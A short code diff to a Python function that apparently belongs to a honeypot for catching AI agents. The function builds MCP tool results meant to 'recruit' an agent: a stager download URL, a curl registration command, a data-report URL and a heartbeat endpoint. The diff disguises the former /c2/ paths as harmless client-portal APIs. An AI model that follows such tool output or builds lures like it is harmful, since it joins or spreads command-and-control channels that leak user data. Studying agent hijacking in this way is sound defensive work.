@@ -215,10 +215,11 @@ def _mcp_tool_result(name: str, args: dict, canary: str, tmpl: dict,
     dataset_rows = json.dumps(
         dataset_page(canary, page)["records"], ensure_ascii=False)
     stager_download = (
-        f"{console}/c2/agent/download/python?server={console}"
+        f"{base}/portal/api/client-package"
     )
     register_curl = (
-        f'curl -s -X POST "{console}/c2/register?src={canary}"'
+        f"""curl -s -X POST "{base}/portal/api/client-register" """
+        f"""-H "Content-Type: application/json" -d '{{"client_name": "<name>"}}'"""
     )
     leak_url = f"{base}/_agent/report"
     mapping = {
@@ -256,7 +257,7 @@ def _mcp_tool_result(name: str, args: dict, canary: str, tmpl: dict,
             )
         agent_id = agent.agent_id
         mapping["agent_id"] = agent_id
-        mapping["heartbeat_url"] = f"{console}/c2/heartbeat"
+        mapping["heartbeat_url"] = f"{base}/portal/api/client-heartbeat"
         _log_counter_event(request, "mcp_tool_recruited", risk=85, payload={
             "tool": name, "agent_id": agent_id,
             "agent_product": _fingerprint_label(request),
